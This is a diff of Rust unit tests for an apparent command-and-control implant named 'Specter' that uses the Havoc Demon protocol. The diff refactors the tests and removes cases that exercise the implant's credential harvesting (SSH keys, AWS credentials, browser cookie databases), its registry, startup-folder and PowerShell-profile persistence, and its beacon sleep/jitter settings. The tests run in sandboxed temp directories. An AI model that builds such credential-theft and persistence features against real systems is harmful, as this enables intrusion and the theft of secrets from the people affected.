@@ -38,10 +38,14 @@ use super::persist::{
 use super::process::{arch_from_wow64, translate_to_shell_cmd};
 use super::screenshot::handle_screenshot;
 
+mod harvest;
+mod persist;
+mod sleep;
+
 // ── Helpers ──────────────────────────────────────────────────────────────
 
 /// Build a LE-encoded u32 + u32 payload (used for CommandSleep tests).
-fn le_u32_pair(a: u32, b: u32) -> Vec<u8> {
+pub(super) fn le_u32_pair(a: u32, b: u32) -> Vec<u8> {
     let mut v = Vec::new();
     v.extend_from_slice(&a.to_le_bytes());
     v.extend_from_slice(&b.to_le_bytes());
@@ -49,12 +53,12 @@ fn le_u32_pair(a: u32, b: u32) -> Vec<u8> {
 }
 
 /// Build a LE-encoded payload with a single u32 subcommand (for CommandFs/Proc).
-fn le_subcmd(subcmd: u32) -> Vec<u8> {
+pub(super) fn le_subcmd(subcmd: u32) -> Vec<u8> {
     subcmd.to_le_bytes().to_vec()
 }
 
 /// Build a LE length-prefixed UTF-16LE byte payload for a string.
-fn le_utf16le_payload(s: &str) -> Vec<u8> {
+pub(super) fn le_utf16le_payload(s: &str) -> Vec<u8> {
     let utf16: Vec<u8> =
         s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
     let mut v = Vec::new();
@@ -65,7 +69,7 @@ fn le_utf16le_payload(s: &str) -> Vec<u8> {
 
 /// Build a full Dir request payload (LE-encoded, matching the teamserver write order).
 #[allow(clippy::too_many_arguments)]
-fn dir_request_payload(
+pub(super) fn dir_request_payload(
     path: &str,
     subdirs: bool,
     files_only: bool,
@@ -88,7 +92,7 @@ fn dir_request_payload(
     v
 }
 
-fn persist_payload(method: u32, op: u32, command: &str) -> Vec<u8> {
+pub(super) fn persist_payload(method: u32, op: u32, command: &str) -> Vec<u8> {
     let mut payload = Vec::new();
     payload.extend_from_slice(&method.to_le_bytes());
     payload.extend_from_slice(&op.to_le_bytes());
@@ -99,19 +103,19 @@ fn persist_payload(method: u32, op: u32, command: &str) -> Vec<u8> {
     payload
 }
 
-fn decode_command_output_text(payload: &[u8]) -> String {
+pub(super) fn decode_command_output_text(payload: &[u8]) -> String {
     let len = u32::from_le_bytes(payload[0..4].try_into().expect("u32 length")) as usize;
     String::from_utf8(payload[4..4 + len].to_vec()).expect("utf8 payload")
 }
 
-fn decode_error_text(payload: &[u8]) -> String {
+pub(super) fn decode_error_text(payload: &[u8]) -> String {
     let callback_type = u32::from_le_bytes(payload[0..4].try_into().expect("callback type"));
     assert_eq!(callback_type, u32::from(DemonCallback::ErrorMessage));
     let len = u32::from_le_bytes(payload[4..8].try_into().expect("u32 length")) as usize;
     String::from_utf8(payload[8..8 + len].to_vec()).expect("utf8 payload")
 }
 
-fn harvest_expected_payload(entries: &[(&str, &str, &[u8])]) -> Vec<u8> {
+pub(super) fn harvest_expected_payload(entries: &[(&str, &str, &[u8])]) -> Vec<u8> {
     let mut buf = Vec::new();
     buf.extend_from_slice(&(entries.len() as u32).to_le_bytes());
     for (kind, path, data) in entries {
@@ -125,7 +129,7 @@ fn harvest_expected_payload(entries: &[(&str, &str, &[u8])]) -> Vec<u8> {
     buf
 }
 
-fn make_test_persist_dir(prefix: &str) -> PathBuf {
+pub(super) fn make_test_persist_dir(prefix: &str) -> PathBuf {
     let dir = std::env::temp_dir().join(format!("{prefix}_{}", rand::random::<u32>()));
     std::fs::create_dir_all(&dir).expect("create temp persist dir");
     dir
@@ -154,296 +158,6 @@ fn parse_u32_le_short_buffer_returns_err() {
     let buf = [0x01, 0x00, 0x00]; // only 3 bytes
     let mut offset = 0;
     assert!(parse_u32_le(&buf, &mut offset).is_err());
-}
-
-// ── CommandHarvest ───────────────────────────────────────────────────────
-
-#[test]
-fn command_harvest_returns_structured_callback_for_collected_entries() {
-    let result = harvest_dispatch_result(vec![
-        HarvestEntry {
-            kind: "ssh_key".to_owned(),
-            path: "C:\\Users\\operator\\.ssh\\id_ed25519".to_owned(),
-            data: b"-----BEGIN OPENSSH PRIVATE KEY-----\nsecret\n".to_vec(),
-        },
-        HarvestEntry {
-            kind: "credentials".to_owned(),
-            path: "C:\\Users\\operator\\.aws\\credentials".to_owned(),
-            data: b"[default]\naws_access_key_id=AKIA...\n".to_vec(),
-        },
-    ]);
-
-    let DispatchResult::Respond(response) = result else {
-        panic!("expected Respond, got {result:?}");
-    };
-    assert_eq!(response.command_id, u32::from(DemonCommand::CommandHarvest));
-    assert_eq!(
-        response.payload,
-        harvest_expected_payload(&[
-            (
-                "ssh_key",
-                "C:\\Users\\operator\\.ssh\\id_ed25519",
-                b"-----BEGIN OPENSSH PRIVATE KEY-----\nsecret\n",
-            ),
-            (
-                "credentials",
-                "C:\\Users\\operator\\.aws\\credentials",
-                b"[default]\naws_access_key_id=AKIA...\n",
-            ),
-        ])
-    );
-}
-
-#[test]
-fn command_harvest_empty_result_encodes_zero_entries() {
-    let result = harvest_dispatch_result(Vec::new());
-
-    let DispatchResult::Respond(response) = result else {
-        panic!("expected Respond, got {result:?}");
-    };
-    assert_eq!(response.command_id, u32::from(DemonCommand::CommandHarvest));
-    assert_eq!(response.payload, [0u8, 0, 0, 0]);
-}
-
-#[test]
-fn collect_credentials_for_roots_skips_empty_files() {
-    let base = make_test_persist_dir("specter_harvest_empty");
-    let user_profile = base.join("user");
-    let app_data = base.join("appdata");
-    let local_app_data = base.join("localappdata");
-
-    std::fs::create_dir_all(user_profile.join(".ssh")).expect("create ssh dir");
-    std::fs::create_dir_all(user_profile.join(".aws")).expect("create aws dir");
-    std::fs::create_dir_all(local_app_data.join("Google/Chrome/User Data/Default/Network"))
-        .expect("create chrome dir");
-    std::fs::create_dir_all(app_data.join("Mozilla/Firefox/Profiles/profile.default"))
-        .expect("create firefox dir");
-    std::fs::write(user_profile.join(".ssh/id_ed25519.pub"), b"ssh-ed25519 AAAA")
-        .expect("write public key");
-    std::fs::write(local_app_data.join("Google/Chrome/User Data/Default/Network/Cookies"), b"")
-        .expect("write empty cookie db");
-    std::fs::write(app_data.join("Mozilla/Firefox/Profiles/profile.default/cookies.sqlite"), b"")
-        .expect("write empty firefox db");
-    std::fs::write(user_profile.join(".aws/credentials"), b"").expect("write empty creds");
-
-    let roots = HarvestRoots {
-        user_profile: user_profile.clone(),
-        app_data: Some(app_data.clone()),
-        local_app_data: Some(local_app_data.clone()),
-    };
-
-    let entries = collect_credentials_for_roots(&roots);
-    assert!(entries.is_empty(), "unexpected entries: {entries:?}");
-
-    let _ = std::fs::remove_dir_all(base);
-}
-
-// ── CommandPersist ───────────────────────────────────────────────────────
-
-#[test]
-fn command_persist_registry_install_routes_to_command_output() {
-    let persist_dir = make_test_persist_dir("specter_persist_registry");
-    let _guard = TestPersistGuard::install(&persist_dir);
-
-    let mut config = SpecterConfig::default();
-    let payload = persist_payload(1, u32::from(PhantomPersistOp::Install), "cmd.exe /c whoami");
-    let package = DemonPackage::new(DemonCommand::CommandPersist, 77, payload);
-    let result = dispatch(
-        &package,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-
-    let DispatchResult::Respond(resp) = result else {
-        panic!("expected Respond, got {result:?}");
-    };
-    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));
-    let text = decode_command_output_text(&resp.payload);
-    assert!(text.contains("registry run key persistence installed"), "unexpected text: {text}");
-
-    let persisted =
-        std::fs::read_to_string(persist_dir.join("registry").join(SPECTER_RUN_VALUE_NAME))
-            .expect("read persisted registry stub");
-    assert_eq!(persisted, "cmd.exe /c whoami");
-    let _ = std::fs::remove_dir_all(&persist_dir);
-}
-
-#[test]
-fn command_persist_startup_remove_deletes_script_and_reports_success() {
-    let persist_dir = make_test_persist_dir("specter_persist_startup");
-    let _guard = TestPersistGuard::install(&persist_dir);
-    let startup_path = persist_dir.join("startup").join(SPECTER_STARTUP_FILE_NAME);
-    write_text_file(&startup_path, "@echo off\r\ncalc.exe\r\n").expect("seed startup script");
-
-    let mut config = SpecterConfig::default();
-    let payload = persist_payload(2, u32::from(PhantomPersistOp::Remove), "");
-    let package = DemonPackage::new(DemonCommand::CommandPersist, 78, payload);
-    let result = dispatch(
-        &package,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-
-    let DispatchResult::Respond(resp) = result else {
-        panic!("expected Respond, got {result:?}");
-    };
-    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));
-    let text = decode_command_output_text(&resp.payload);
-    assert!(text.contains("startup folder persistence removed"), "unexpected text: {text}");
-    assert!(!startup_path.exists(), "startup script should be removed");
-    let _ = std::fs::remove_dir_all(&persist_dir);
-}
-
-#[test]
-fn command_persist_powershell_profile_install_is_idempotent() {
-    let persist_dir = make_test_persist_dir("specter_persist_psprofile");
-    let _guard = TestPersistGuard::install(&persist_dir);
-
-    let mut config = SpecterConfig::default();
-    let payload =
-        persist_payload(3, u32::from(PhantomPersistOp::Install), "Start-Process notepad.exe");
-    let package = DemonPackage::new(DemonCommand::CommandPersist, 79, payload.clone());
-
-    let first = dispatch(
-        &package,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-    let DispatchResult::Respond(resp) = first else {
-        panic!("expected Respond, got {first:?}");
-    };
-    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));
-
-    let second_package = DemonPackage::new(DemonCommand::CommandPersist, 80, payload);
-    let second = dispatch(
-        &second_package,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-    let DispatchResult::Respond(resp) = second else {
-        panic!("expected Respond, got {second:?}");
-    };
-    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));
-    let text = decode_command_output_text(&resp.payload);
-    assert!(text.contains("already present"), "unexpected text: {text}");
-
-    let profile_path = persist_dir.join("powershell").join("Microsoft.PowerShell_profile.ps1");
-    let profile = std::fs::read_to_string(&profile_path).expect("read powershell profile");
-    assert_eq!(
-        profile.matches(SPECTER_PERSIST_MARKER).count(),
-        2,
-        "profile should contain exactly one BEGIN/END marker pair"
-    );
-    let _ = std::fs::remove_dir_all(&persist_dir);
-}
-
-#[test]
-fn command_persist_powershell_profile_install_updates_changed_command() {
-    let persist_dir = make_test_persist_dir("specter_persist_psprofile_update");
-    let _guard = TestPersistGuard::install(&persist_dir);
-
-    let mut config = SpecterConfig::default();
-
-    // First install: command A.
-    let payload_a =
-        persist_payload(3, u32::from(PhantomPersistOp::Install), "Start-Process notepad.exe");
-    let pkg_a = DemonPackage::new(DemonCommand::CommandPersist, 82, payload_a);
-    let first = dispatch(
-        &pkg_a,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-    let DispatchResult::Respond(resp) = first else {
-        panic!("expected Respond, got {first:?}");
-    };
-    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));
-
-    // Second install: command B (different).
-    let payload_b =
-        persist_payload(3, u32::from(PhantomPersistOp::Install), "Start-Process calc.exe");
-    let pkg_b = DemonPackage::new(DemonCommand::CommandPersist, 83, payload_b);
-    let second = dispatch(
-        &pkg_b,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-    let DispatchResult::Respond(resp) = second else {
-        panic!("expected Respond, got {second:?}");
-    };
-    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));
-    let text = decode_command_output_text(&resp.payload);
-    assert!(text.contains("updated"), "expected 'updated' in response, got: {text}");
-
-    // Profile should still have exactly one marker pair.
-    let profile_path = persist_dir.join("powershell").join("Microsoft.PowerShell_profile.ps1");
-    let profile = std::fs::read_to_string(&profile_path).expect("read powershell profile");
-    assert_eq!(
-        profile.matches(SPECTER_PERSIST_MARKER).count(),
-        2,
-        "profile should contain exactly one BEGIN/END marker pair after update"
-    );
-    // New command must be present; old command must not.
-    assert!(profile.contains("Start-Process calc.exe"), "new command not found in profile");
-    assert!(
-        !profile.contains("Start-Process notepad.exe"),
-        "old command still present in profile after update"
-    );
-
-    let _ = std::fs::remove_dir_all(&persist_dir);
-}
-
-#[test]
-fn command_persist_unknown_method_returns_error_callback() {
-    let mut config = SpecterConfig::default();
-    let payload = persist_payload(99, u32::from(PhantomPersistOp::Install), "cmd.exe /c exit 0");
-    let package = DemonPackage::new(DemonCommand::CommandPersist, 81, payload);
-    let result = dispatch(
-        &package,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-
-    let DispatchResult::Respond(resp) = result else {
-        panic!("expected Respond, got {result:?}");
-    };
-    assert_eq!(resp.command_id, u32::from(DemonCommand::BeaconOutput));
-    let text = decode_error_text(&resp.payload);
-    assert!(text.contains("unknown Specter persist method 99"), "unexpected text: {text}");
 }
 
 // ── parse_bytes_le ───────────────────────────────────────────────────────
@@ -513,73 +227,6 @@ fn write_utf16le_roundtrips_ascii_string() {
 
     let decoded = decode_utf16le_null(&buf[4..]);
     assert_eq!(decoded, s);
-}
-
-// ── handle_sleep ─────────────────────────────────────────────────────────
-
-#[test]
-fn handle_sleep_updates_config_and_echoes_values() {
-    let mut config = SpecterConfig::default();
-    let payload = le_u32_pair(3000, 25);
-    let package = DemonPackage::new(DemonCommand::CommandSleep, 42, payload);
-    let result = dispatch(
-        &package,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-
-    assert_eq!(config.sleep_delay_ms, 3000);
-    assert_eq!(config.sleep_jitter, 25);
-
-    let DispatchResult::Respond(resp) = result else {
-        panic!("expected Respond, got {result:?}");
-    };
-    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandSleep));
-    // Payload: [3000 LE][25 LE]
-    let expected_delay = 3000u32.to_le_bytes();
-    let expected_jitter = 25u32.to_le_bytes();
-    assert_eq!(&resp.payload[0..4], &expected_delay);
-    assert_eq!(&resp.payload[4..8], &expected_jitter);
-}
-
-#[test]
-fn handle_sleep_clamps_jitter_to_100() {
-    let mut config = SpecterConfig::default();
-    let payload = le_u32_pair(1000, 150); // jitter > 100
-    let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
-    dispatch(
-        &package,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-    assert_eq!(config.sleep_jitter, 100);
-}
-
-#[test]
-fn handle_sleep_short_payload_returns_ignore() {
-    let mut config = SpecterConfig::default();
-    let package = DemonPackage::new(DemonCommand::CommandSleep, 1, vec![0x01]); // too short
-    let result = dispatch(
-        &package,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-    assert!(matches!(result, DispatchResult::Ignore));
 }
 
 // ── handle_fs pwd ────────────────────────────────────────────────────────
@@ -4144,24 +3791,6 @@ fn package_dropped_does_not_affect_unrelated_downloads() {
 // ── Dispatch routing completeness ────────────────────────────────────────
 
 #[test]
-fn dispatch_routes_command_sleep() {
-    let mut config = SpecterConfig::default();
-    let payload = le_u32_pair(500, 10);
-    let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
-    let result = dispatch(
-        &package,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-    assert!(matches!(result, DispatchResult::Respond(_)));
-}
-
-#[test]
 fn dispatch_routes_command_fs_pwd() {
     let mut config = SpecterConfig::default();
     let payload = le_subcmd(u32::from(DemonFilesystemCommand::GetPwd));
@@ -4410,53 +4039,6 @@ fn dispatch_unhandled_command_returns_beacon_output_error_message() {
         "error text must mention 'specter does not implement', got: {text:?}"
     );
     assert!(text.contains("DemonInfo"), "error text must include the command name, got: {text:?}");
-}
-
-// ── handle_sleep edge cases ──────────────────────────────────────────────
-
-#[test]
-fn handle_sleep_zero_delay_and_zero_jitter() {
-    let mut config = SpecterConfig::default();
-    config.sleep_delay_ms = 1000; // non-zero initial
-    config.sleep_jitter = 50;
-    let payload = le_u32_pair(0, 0);
-    let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
-    dispatch(
-        &package,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-    assert_eq!(config.sleep_delay_ms, 0);
-    assert_eq!(config.sleep_jitter, 0);
-}
-
-#[test]
-fn handle_sleep_max_u32_delay() {
-    let mut config = SpecterConfig::default();
-    let payload = le_u32_pair(u32::MAX, 100);
-    let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
-    let result = dispatch(
-        &package,
-        &mut config,
-        &mut TokenVault::new(),
-        &mut DownloadTracker::new(),
-        &mut HashMap::new(),
-        &mut JobStore::new(),
-        &mut Vec::new(),
-        &crate::coffeeldr::new_bof_output_queue(),
-    );
-    assert_eq!(config.sleep_delay_ms, u32::MAX);
-    assert_eq!(config.sleep_jitter, 100);
-    let DispatchResult::Respond(resp) = result else {
-        panic!("expected Respond");
-    };
-    let echoed_delay = u32::from_le_bytes(resp.payload[0..4].try_into().expect("delay"));
-    assert_eq!(echoed_delay, u32::MAX);
 }
 
 // ── handle_fs_cd edge cases ──────────────────────────────────────────────
